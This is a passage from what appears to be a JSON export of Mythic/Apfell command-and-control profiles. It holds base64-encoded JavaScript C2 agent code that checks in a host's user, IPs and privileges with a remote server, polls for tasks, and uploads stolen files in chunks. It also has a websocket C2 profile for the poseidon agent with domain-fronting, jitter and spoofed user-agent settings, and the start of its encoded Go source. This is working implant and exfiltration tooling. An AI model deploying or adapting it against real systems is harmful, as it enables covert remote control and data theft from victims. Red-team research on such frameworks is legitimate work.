bHVlKHZhbHVlLCBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ3RyYW5zZm9ybXMnXSk7CiAgICAgICAgICAgIGJhc2VfdXJpID0gYmFzZV91cmkucmVwbGFjZShlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ25hbWUnXSwgdmFsdWUpOwogICAgICAgIH0KICAgICAgICBsZXQgcXVlcnlfc3RyaW5nID0gIj8iOwogICAgICAgIGZvcihsZXQgaSBpbiBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ3ZhbHVlJ107CiAgICAgICAgICAgIGlmKHZhbHVlID09PSB1bmRlZmluZWQpe3ZhbHVlID0gIiI7fQogICAgICAgICAgICBpZih2YWx1ZSA9PT0gIm1lc3NhZ2UiKXt2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3ZhbHVlKHZhbHVlLCBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ3RyYW5zZm9ybXMnXSk7CiAgICAgICAgICAgIGxldCBOU0NoYXJhY3RlclNldCA9ICQuTlNDaGFyYWN0ZXJTZXQuY2hhcmFjdGVyU2V0V2l0aENoYXJhY3RlcnNJblN0cmluZygiLys9XG4iKS5pbnZlcnRlZFNldDsKICAgICAgICAgICAgdmFsdWUgPSAkKHZhbHVlKS5zdHJpbmdCeUFkZGluZ1BlcmNlbnRFbmNvZGluZ1dpdGhBbGxvd2VkQ2hhcmFjdGVycyhOU0NoYXJhY3RlclNldCkuanM7CiAgICAgICAgICAgIHF1ZXJ5X3N0cmluZyArPSBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ25hbWUnXSArICI9IiArIHZhbHVlICsgIiYiOwogICAgICAgIH0KICAgICAgICBiYXNlX3VyaSArPSBxdWVyeV9zdHJpbmcuc2xpY2UoMCwgLTEpOyAvL3Rha2Ugb2ZmIHRyYWlsaW5nICYgb3IgPwogICAgICAgIGxldCBjb29raWVzID0ge307CiAgICAgICAgZm9yKGxldCBpIGluIGVuZHBvaW50WydDb29raWVzJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsnQ29va2llcyddW2ldWyd2YWx1ZSddOwogICAgICAgICAgICBpZih2YWx1ZSA9PT0gdW5kZWZpbmVkKXsgdmFsdWUgPSAiIjt9CiAgICAgICAgICAgIGlmKHZhbHVlID09PSAibWVzc2FnZSIpeyB2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3ZhbHVlKHZhbHVlLCBlbmRwb2ludFsnQ29va2llcyddW2ldWyd0cmFuc2Zvcm1zJ10pOwogICAgICAgICAgICBjb29raWVzW2VuZHBvaW50WydDb29raWVzJ11baV1bJ25hbWUnXV0gPSB2YWx1ZTsKICAgICAgICB9CiAgICAgICAgbGV0IGhlYWRlcnMgPSBlbmRwb2ludFsnQWdlbnRIZWFkZXJzJ107CiAgICAgICAgbGV0IGNvb2tpZV9oZWFkZXIgPSAiIjsKICAgICAgICBmb3IobGV0IGkgaW4gY29va2llcyl7CiAgICAgICAgICAgIGNvb2tpZV9oZWFkZXIgKz0gaSArICI9IiArIGNvb2tpZXNbaV0gKyAiOyI7CiAgICAgICAgfQogICAgICAgIGlmKGNvb2tpZV9oZWFkZXIgIT09ICIiKXsKICAgICAgICAgICAgaGVhZGVyc1snQ29va2llJ10gPSBjb29raWVfaGVhZGVyOwogICAgICAgIH0KICAgICAgICBsZXQgdXJsID0gYmFzZV91cmwgKyBiYXNlX3VyaTsKICAgICAgICBsZXQgYm9keSA9IHRoaXMuY3JlYXRlX3ZhbHVlKGRhdGEsIGVuZHBvaW50WydCb2R5J10pOwogICAgICAgIC8vIG5vdyBtYWtlIHRoZSByZXF1ZXN0IG9iamVjdAogICAgICAgIGxldCByZXEgPSAkLk5TTXV0YWJsZVVSTFJlcXVlc3QuYWxsb2MuaW5pdFdpdGhVUkwoJC5OU1VSTC5VUkxXaXRoU3RyaW5nKHVybCkpOwogICAgICAgIGZvcihsZXQgaSBpbiBoZWFkZXJzKSB7CiAgICAgICAgICAgIHJlcS5zZXRWYWx1ZUZvckhUVFBIZWFkZXJGaWVsZCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZyhoZWFkZXJzW2ldKSwgJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aFVURjhTdHJpbmcoaSkpOwogICAgICAgIH0KICAgICAgICBpZihtZXRob2QgPT09ICJQT1NUIikgewogICAgICAgICAgICByZXEuc2V0SFRUUE1ldGhvZCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZygiUE9TVCIpKTsKICAgICAgICAgICAgbGV0IHBvc3REYXRhID0gJChib2R5KS5kYXRhVXNpbmdFbmNvZGluZ0FsbG93TG9zc3lDb252ZXJzaW9uKCQuTlNTdHJpbmcuTlNBU0NJSVN0cmluZ0VuY29kaW5nLCB0cnVlKTsKICAgICAgICAgICAgbGV0IHBvc3RMZW5ndGggPSAkLk5TU3RyaW5nLnN0cmluZ1dpdGhGb3JtYXQoIiVkIiwgcG9zdERhdGEubGVuZ3RoKTsKICAgICAgICAgICAgcmVxLmFkZFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKHBvc3RMZW5ndGgsICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKCdDb250ZW50LUxlbmd0aCcpKTsKICAgICAgICAgICAgcmVxLnNldEhUVFBCb2R5KHBvc3REYXRhKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlcTsKICAgIH0KICBnZXRDb25maWcoKXsKICAgIC8vQSBSRVNUZnVsIGJhc2UgY29uZmlnIGNvbnNpc3RzIG9mIHRoZSBmb2xsb3dpbmc6CiAgICAvLyAgQmFzZVVSTCAoaW5jbHVkZXMgUG9ydCksIENhbGxiYWNrSW50ZXJ2YWwsIEtpbGxEYXRlIChub3QgaW1wbGVtZW50ZWQgeWV0KQogICAgbGV0IGNvbmZpZyA9IHsKICAgICAgIkMyIjogewogICAgICAgICAgImNvbW1hbmRzIjogdGhpcy5jb21tYW5kcy5qb2luKCIsIiksCiAgICAgICAgICAiYXBpX3ZlcnNpb24iOiB0aGlzLmFwaV92ZXJzaW9uLAogICAgICAgICAgImFlc19wc2siOiB0aGlzLmFlc19wc2ssCiAgICAgICAgICAiY29uZmlnIjogdGhpcy5jMl9jb25maWcKICAgICAgfSwKICAgICAgIkhvc3QiOiB7CiAgICAgICAgICAidXNlciI6IGFwZmVsbC51c2VyLAogICAgICAgICAgImZ1bGxOYW1lIjogYXBmZWxsLmZ1bGxOYW1lLAogICAgICAgICAgImlwcyI6IGFwZmVsbC5pcCwKICAgICAgICAgICJob3N0cyI6IGFwZmVsbC5ob3N0LAogICAgICAgICAgImVudmlyb25tZW50IjogYXBmZWxsLmVudmlyb25tZW50LAogICAgICAgICAgInVwdGltZSI6IGFwZmVsbC51cHRpbWUsCiAgICAgICAgICAiYXJncyI6IGFwZmVsbC5hcmdzLAogICAgICAgICAgInBpZCI6IGFwZmVsbC5waWQsCiAgICAgICAgICAiYXBmZWxsX2lkIjogYXBmZWxsLmlkLAogICAgICAgICAgInBheWxvYWRfaWQiOiBhcGZlbGwudXVpZAogICAgICB9fTsKICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShjb25maWcsIG51bGwsIDIpOwogIH0KICBjaGVja2luKGlwLCBwaWQsIHVzZXIsIGhvc3QsIG9zLCBhcmNoaXRlY3R1cmUpewogICAgbGV0IGluZm8gPSB7J2lwJzppcCwncGlkJzpwaWQsJ3VzZXInOnVzZXIsJ2hvc3QnOmhvc3QsJ3V1aWQnOmFwZmVsbC51dWlkLCAib3MiOiBvcywgImFyY2hpdGVjdHVyZSI6IGFyY2hpdGVjdHVyZSwgImFjdGlvbiI6ICJjaGVja2luIn07CiAgICBpZih1c2VyID09PSAncm9vdCcpe2luZm9bJ2ludGVncml0eV9sZXZlbCddID0gMzt9CiAgICAvL2xldCByZXEgPSBudWxsOwogICAgbGV0IGpzb25kYXRhID0gbnVsbDsKICAgIGlmKHRoaXMuZXhjaGFuZ2luZ19rZXlzKXsKICAgICAgICBsZXQgc2Vzc2lvbklEID0gdGhpcy5uZWdvdGlhdGVfa2V5KCk7CiAgICAgICAganNvbmRhdGEgPSB0aGlzLm1ha2VfcmVxdWVzdCgiUE9TVCIsIHNlc3Npb25JRCwgaW5mbyk7CiAgICB9ZWxzZXsKICAgICAgICBqc29uZGF0YSA9IHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLnV1aWQsIGluZm8pOwogICAgfQogICAgYXBmZWxsLmlkID0ganNvbmRhdGEuaWQ7CiAgICAvLyBpZiB3ZSBmYWlsIHRvIGdldCBhbiBJRCBudW1iZXIgdGhlbiBleGl0IHRoZSBhcHBsaWNhdGlvbgogICAgaWYoYXBmZWxsLmlkID09PSB1bmRlZmluZWQpeyAkLk5TQXBwbGljYXRpb24uc2hhcmVkQXBwbGljYXRpb24udGVybWluYXRlKHRoaXMpOyB9CiAgICByZXR1cm4ganNvbmRhdGE7CiAgfQogIGdldFRhc2tpbmcoKXsKICAgIHdoaWxlKHRydWUpewogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IHRhc2sgPSB0aGlzLm1ha2VfcmVxdWVzdCgiR0VUIiwgYXBmZWxsLmlkLCAgeyJ0YXNraW5nX3NpemUiOjEsICJhY3Rpb24iOiAiZ2V0X3Rhc2tpbmcifSk7CiAgICAgICAgICAgIHJldHVybiB0YXNrWyd0YXNrcyddOwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIC8vY29uc29sZS5sb2coImVycm9yIGluIGdldFRhc2tpbmc6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOyAgLy8gZG9uJ3Qgc3BpbiBvdXQgY3JhenkgaWYgdGhlIGNvbm5lY3Rpb24gZmFpbHMKICAgICAgICB9CiAgICB9CiAgfQogIHBvc3RSZXNwb25zZSh0YXNrLCBkYXRhKXsKICAgIC8vZGVwZW5kaW5nIG9uIHRoZSBhbW91bnQgb2YgZGF0YSB3ZSdyZSBzZW5kaW5nLCB3ZSBtaWdodCBuZWVkIHRvIGNodW5rIGl0CiAgICBkYXRhWyd0YXNrX2lkJ10gPSB0YXNrLmlkOwogICAgbGV0IHBvc3REYXRhID0geyJhY3Rpb24iOiAicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOiBbZGF0YV19OwogICAgcmV0dXJuIHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLmlkLCBwb3N0RGF0YSApOwogIH0KICBtYWtlX3JlcXVlc3QobWV0aG9kPSJQT1NUIiwgdWlkPWFwZmVsbC5pZCwgZGF0YT1udWxsKXsKICAgIHdoaWxlKHRydWUpewogICAgICB0cnl7CiAgICAgICAgICBsZXQgcmVxOwogICAgICAgICAgaWYobWV0aG9kID09PSAiUE9TVCIpewogICAgICAgICAgICAgIGlmKHRoaXMucG9zdF9tZXNzYWdlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgIHJlcSA9IHRoaXMuY3JlYXRlX21lc3NhZ2UodGhpcy5nZXRfcmFuZG9tX2VsZW1lbnQodGhpcy5wb3N0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMuZ2V0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH0KICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgIGlmKHRoaXMuZ2V0X21lc3NhZ2VzLmxlbmd0aCA+IDApewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMuZ2V0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMucG9zdF9tZXNzYWdlcyksIGRhdGEsIHVpZCwgbWV0aG9kKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgICAvL2ZvciBzb21lIHJlYXNvbiBpdCBzb21ldGltZXMgcmFuZG9tbHkgZmFpbHMgdG8gc2VuZCB0aGUgZGF0YSwgdGhyb3dpbmcgYSBKU09OIGVycm9yLiBsb29wIHRvIGZpeCBmb3Igbm93CiAgICAgICAgbGV0IHJlc3BvbnNlID0gUmVmKCk7CiAgICAgICAgbGV0IGVycm9yID0gUmVmKCk7CiAgICAgICAgbGV0IHJlc3BvbnNlRGF0YSA9ICQuTlNVUkxDb25uZWN0aW9uLnNlbmRTeW5jaHJvbm91c1JlcXVlc3RSZXR1cm5pbmdSZXNwb25zZUVycm9yKHJlcSxyZXNwb25zZSxlcnJvcik7CiAgICAgICAgcmVzcG9uc2VEYXRhID0gdGhpcy5yZXRyaWV2ZV9tZXNzYWdlKHJlc3BvbnNlRGF0YSwgbWV0aG9kKTsKICAgICAgICBpZiggcmVzcG9uc2VEYXRhLmxlbmd0aCA8IDM2KXsKICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgbGV0IHJlc3AgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHJlc3BvbnNlRGF0YSk7CiAgICAgICAgbGV0IHV1aWRfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDAsIDM2KTsKICAgICAgICBsZXQgbWVzc2FnZV9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMzYsIHJlc3AubGVuZ3RoIC0gMzYpOwogICAgICAgIGxldCB1dWlkID0gJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZyhyZXNwLnN1YmRhdGFXaXRoUmFuZ2UodXVpZF9yYW5nZSksICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpLmpzOwogICAgICAgIC8vY29uc29sZS5sb2coImNhcnZpbmcgb3V0IHJlc3Qgb2YgbWVzc2FnZSIpOwogICAgICAgIGlmKHV1aWQgIT09IGFwZmVsbC51dWlkICYmIHV1aWQgIT09IGFwZmVsbC5pZCAmJiB1dWlkICE9PSB1aWQpewogICAgICAgICAgICAvL2NvbnNvbGUubG9nKCJpZCBkb2Vzbid0IG1hdGNoOiAiICsgdXVpZCk7CiAgICAgICAgICAgICQuTlNUaHJlYWQuc2xlZXBGb3JUaW1lSW50ZXJ2YWwodGhpcy5nZW5fc2xlZXBfdGltZSgpKTsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIHJlc3AgPSByZXNwLnN1YmRhdGFXaXRoUmFuZ2UobWVzc2FnZV9yYW5nZSk7IC8vY291bGQgZWl0aGVyIGJlIHBsYWludGV4dCBqc29uIG9yIGVuY3J5cHRlZCBieXRlcwogICAgICAgIC8vd2UncmUgbm90IGRvaW5nIHRoZSBpbml0aWFsIGtleSBleGNoYW5nZQogICAgICAgIGlmKHRoaXMuYWVzX3BzayAhPT0gIiIpewogICAgICAgICAgICAvL2lmIHdlIGRvIG5lZWQgdG8gZGVjcnlwdCB0aGUgcmVzcG9uc2UgdGhvdWdoLCBkbyB0aGF0CiAgICAgICAgICAgIHJlc3AgPSBPYmpDLnVud3JhcCh0aGlzLmRlY3J5cHRfbWVzc2FnZShyZXNwKSk7CiAgICAgICAgICAgIHJldHVybiBKU09OLnBhcnNlKHJlc3ApOwogICAgICAgIH1lbHNlewogICAgICAgICAgICAvL3dlIGRvbid0IG5lZWQgdG8gZGVjcnlwdCBpdCwgc28gd2UgY2FuIGp1c3QgcGFyc2UgYW5kIHJldHVybiBpdAogICAgICAgICAgICByZXR1cm4gSlNPTi5wYXJzZShPYmpDLmRlZXBVbndyYXAoJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZyhyZXNwLCAkLk5TVVRGOFN0cmluZ0VuY29kaW5nKSkpOwogICAgICAgIH0KICAgICAgfQogICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAvL2NvbnNvbGUubG9nKCJlcnJvciBpbiBtYWtlX3JlcXVlc3Q6ICIgICsgZXJyb3IudG9TdHJpbmcoKSk7CiAgICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwogICAgICB9CiAgICB9CiAgfQogIGRvd25sb2FkKHRhc2ssIHBhcmFtcyl7CiAgICBsZXQgb3V0cHV0ID0gIiI7CiAgICBpZiggZG9lc19maWxlX2V4aXN0KHBhcmFtcykpewogICAgICAgIGxldCBvZmZzZXQgPSAwOwogICAgICAgIGxldCBjaHVua1NpemUgPSB0aGlzLmNodW5rX3NpemU7IC8vMzUwMDsKICAgICAgICBsZXQgZnVsbF9wYXRoID0gcGFyYW1zOwogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IGZtID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgICAgICBsZXQgcGllY2VzID0gT2JqQy5kZWVwVW53cmFwKGZtLmNvbXBvbmVudHNUb0Rpc3BsYXlGb3JQYXRoKHBhcmFtcykpOwogICAgICAgICAgICBmdWxsX3BhdGggPSAiLyIgKyBwaWVjZXMuc2xpY2UoMSkuam9pbigiLyIpOwogICAgICAgICAgICB2YXIgaGFuZGxlID0gJC5OU0ZpbGVIYW5kbGUuZmlsZUhhbmRsZUZvclJlYWRpbmdBdFBhdGgoZnVsbF9wYXRoKTsKICAgICAgICAgICAgLy8gR2V0IHRoZSBmaWxlIHNpemUgYnkgc2Vla2luZzsKICAgICAgICAgICAgdmFyIGZpbGVTaXplID0gaGFuZGxlLnNlZWtUb0VuZE9mRmlsZTsKICAgICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geydzdGF0dXMnOiAnZXJyb3InLCAndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIC8vIGFsd2F5cyByb3VuZCB1cCB0byBhY2NvdW50IGZvciBjaHVua3MgdGhhdCBhcmUgPCBjaHVua3NpemU7CiAgICAgICAgbGV0IG51bU9mQ2h1bmtzID0gTWF0aC5jZWlsKGZpbGVTaXplIC8gY2h1bmtTaXplKTsKICAgICAgICBsZXQgcmVnaXN0ZXJEYXRhID0geyd0b3RhbF9jaHVua3MnOiBudW1PZkNodW5rcywgImZ1bGxfcGF0aCI6IGZ1bGxfcGF0aH07CiAgICAgICAgbGV0IHJlZ2lzdGVyRmlsZSA9IHRoaXMucG9zdFJlc3BvbnNlKHRhc2ssIHJlZ2lzdGVyRGF0YSk7CiAgICAgICAgaWYgKHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ3N0YXR1cyddID09PSAic3VjY2VzcyIpewogICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldCgwKTsKICAgICAgICAgICAgbGV0IGN1cnJlbnRDaHVuayA9IDE7CiAgICAgICAgICAgIGxldCBkYXRhID0gaGFuZGxlLnJlYWREYXRhT2ZMZW5ndGgoY2h1bmtTaXplKTsKICAgICAgICAgICAgd2hpbGUocGFyc2VJbnQoZGF0YS5sZW5ndGgpID4gMCAmJiBvZmZzZXQgPCBmaWxlU2l6ZSl7CiAgICAgICAgICAgICAgICAvLyBzZW5kIGEgY2h1bmsKICAgICAgICAgICAgICAgIGxldCBmaWxlRGF0YSA9IHsnY2h1bmtfbnVtJzogY3VycmVudENodW5rLCAnY2h1bmtfZGF0YSc6IGRhdGEuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzLCAnZmlsZV9pZCc6IHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ2ZpbGVfaWQnXX07CiAgICAgICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSB0aGlzLnBvc3RSZXNwb25zZSh0YXNrLCBmaWxlRGF0YSk7CiAgICAgICAgICAgICAgICBpZihyZXNwb25zZVsncmVzcG9uc2VzJ11bMF1bJ3N0YXR1cyddID09PSAnc3VjY2VzcycpewogICAgICAgICAgICAgICAgICBvZmZzZXQgKz0gcGFyc2VJbnQoZGF0YS5sZW5ndGgpOwogICAgICAgICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldChvZmZzZXQpOwogICAgICAgICAgICAgICAgICBjdXJyZW50Q2h1bmsgKz0gMTsKICAgICAgICAgICAgICAgICAgZGF0YSA9IGhhbmRsZS5yZWFkRGF0YU9mTGVuZ3RoKGNodW5rU2l6ZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0cHV0ID0geyJjb21wbGV0ZWQiOnRydWUsICJmaWxlX2lkIjogcmVnaXN0ZXJGaWxlWydyZXNwb25zZXMnXVswXVsnZmlsZV9pZCddfTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICBvdXRwdXQgPSB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6ICJGYWlsZWQgdG8gcmVnaXN0ZXIgZmlsZSB0byBkb3dubG9hZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIG91dHB1dCA9IHsnc3RhdHVzJzogJ2Vycm9yJywgJ3VzZXJfb3V0cHV0JzogImZpbGUgZG9lcyBub3QgZXhpc3QiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9CiAgICByZXR1cm4gb3V0cHV0OwogIH0KICB1cGxvYWQodGFzaywgZmlsZV9pZCwgZnVsbF9wYXRoKXsKICAgIHRyeXsKICAgICAgICBsZXQgZGF0YSA9IHsiYWN0aW9uIjogInVwbG9hZCIsICJmaWxlX2lkIjogZmlsZV9pZCwgImNodW5rX3NpemUiOiB0aGlzLmNodW5rX3NpemUsICJjaHVua19udW0iOiAxLCAiZnVsbF9wYXRoIjogZnVsbF9wYXRoLCAidGFza19pZCI6IHRhc2suaWR9OwogICAgICAgIGxldCBjaHVua19udW0gPSAxOwogICAgICAgIGxldCB0b3RhbF9jaHVua3MgPSAxOwogICAgICAgIGxldCB0b3RhbF9kYXRhID0gJC5OU011dGFibGVEYXRhLmRhdGFXaXRoTGVuZ3RoKDApOwogICAgICAgIGRvewogICAgICAgICAgICBsZXQgZmlsZV9kYXRhID0gdGhpcy5tYWtlX3JlcXVlc3QoIlBPU1QiLCBhcGZlbGwuaWQsIGRhdGEpOwogICAgICAgICAgICBpZihmaWxlX2RhdGFbJ2NodW5rX251bSddID09PSAwKXsKICAgICAgICAgICAgICAgIHJldHVybiB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6ICJFcnJvciBmcm9tIHRoZSBzZXJ2ZXIiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2h1bmtfbnVtID0gZmlsZV9kYXRhWydjaHVua19udW0nXTsKICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gZmlsZV9kYXRhWyd0b3RhbF9jaHVua3MnXTsKICAgICAgICAgICAgdG90YWxfZGF0YS5hcHBlbmREYXRhKCQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcoJChmaWxlX2RhdGFbJ2NodW5rX2RhdGEnXSkpKTsKICAgICAgICAgICAgZGF0YSA9IHsiYWN0aW9uIjogInVwbG9hZCIsICJmaWxlX2lkIjogZmlsZV9pZCwgImNodW5rX3NpemUiOiB0aGlzLmNodW5rX3NpemUsICJjaHVua19udW0iOiBjaHVua19udW0gKyAxfTsKICAgICAgICB9d2hpbGUoY2h1bmtfbnVtIDwgdG90YWxfY2h1bmtzKTsKICAgICAgcmV0dXJuIHRvdGFsX2RhdGE7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6IGVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH0KICB9Cn0KLy8tLS0tLS0tLS0tLS0tIElOU1RBTlRJQVRFIE9VUiBDMiBDTEFTUyBCRUxPVyBIRVJFIElOIE1BSU4gQ09ERS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCk9iakMuaW1wb3J0KCdTZWN1cml0eScpOwpDMiA9IG5ldyBjdXN0b21DMigpOwo="
            }
          ]
        }
      ]
    },
    {
      "description": "Websocket C2 Server for poseidon",
      "running": false,
      "container_running": true,
      "external": false,
      "author": "@xorrior",
      "is_p2p": false,
      "is_server_routed": false,
      "sampleServer": "",
      "sampleClient": "",
      "notes": "The 'Config.json' file is what configures the 'server' file within the docker container. Be sure to update this to match the port your server is listening on as well as updating it to match the configuration of your agent. \n\n- usessl -> Listen on the specified port and enable SSL. If \"key.pem\" and \"cert.pem\" don't exist, the server will generate a self-signed certificate and key file.\n- sslkey -> path to the ssl private key\n- sslcert -> path to the ssl certificate\n- websocketuri -> Websocket endpoint used for client connections (e.g. wss:\/\/myserver\/websocketuri)\n- pollinterval -> This is not used for the websockets profile",
      "deleted": false,
      "creation_time": "03\/06\/2020 15:22:03",
      "last_heartbeat": "03\/06\/2020 15:32:35",
      "name": "websocket",
      "icon": null,
      "params": [
        {
          "name": "Callback host",
          "key": "callback_host",
          "hint": "ws:\/\/127.0.0.1",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Host header (for domain fronting)",
          "key": "domain_front",
          "hint": "",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Base64 32byte AES Key",
          "key": "AESPSK",
          "hint": "",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback interval (in seconds)",
          "key": "callback_interval",
          "hint": "10",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback port",
          "key": "callback_port",
          "hint": "8080",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Callback jitter (in percent)",
          "key": "callback_jitter",
          "hint": "37",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Websockets Endpoint",
          "key": "ENDPOINT_REPLACE",
          "hint": "socket",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "Encrypted Key Exchange (T\/F)",
          "key": "encrypted_exchange_check",
          "hint": "T",
          "randomize": false,
          "format_string": ""
        },
        {
          "name": "User Agent",
          "key": "USER_AGENT",
          "hint": "Mozilla\/5.0 (Windows NT 6.3; Trident\/7.0; rv:11.0) like Gecko",
          "randomize": false,
          "format_string": ""
        }
      ],
      "payload_types": [
        {
          "name": "poseidon",
          "files": [
            {
              "websocket.go": "Ly8gK2J1aWxkIHdlYnNvY2tldAoKcGFja2FnZSBwcm9maWxlcwoKaW1wb3J0ICgKCSJieXRlcyIKCSJjcnlwdG8vcnNhIgoJImVuY29kaW5nL2Jhc2U2NCIKCSJlbmNvZGluZy9qc29uIgoJImZtdCIKCSJtYXRoIgoJIm5ldC9odHRwIgoJIm9zIgoJInJlZmxlY3QiCgkic3RyaW5ncyIKCSJ0aW1lIgoJInN5bmMiCgkiY3J5cHRvL3RscyIKCS8vImxvZyIKCgkiZ2l0aHViLmNvbS9nb3JpbGxhL3dlYnNvY2tldCIKCSJwa2cvdXRpbHMvY3J5cHRvIgoJInBrZy91dGlscy9mdW5jdGlvbnMiCgkicGtnL3V0aWxzL3N0cnVjdHMiCikKCnZhciBtdSBzeW5jLk11dGV4Cgp2YXIgQ29uZmlnID0gc3RydWN0cy5XZWJzb2NrZXRjb25maWd7CgkiZW5jcnlwdGVkX2V4Y2hhbmdlX2NoZWNrIiwKCSJBRVNQU0siLAoJImNhbGxiYWNrX2hvc3Q6Y2FsbGJhY2tfcG9ydC8iLAoJIlVTRVJfQUdFTlQiLAoJY2FsbGJhY2tfaW50ZXJ2YWwsCgkiZG9tYWluX2Zyb250IiwKCWNhbGxiYWNrX2ppdHRlciwKCSJFTkRQT0lOVF9SRVBMQUNFIiwKfQoKdHlwZSBDMldlYnNvY2tldHMgc3RydWN0IHsKCUhvc3RIZWFkZXIgICAgIHN0cmluZwoJQmFzZVVSTCAgICAgICAgc3RyaW5nCglJbnRlcnZhbCAgICAgICBpbnQKCUppdHRlciAgICAgICAgIGludAoJRXhjaGFuZ2luZ0tleXMgYm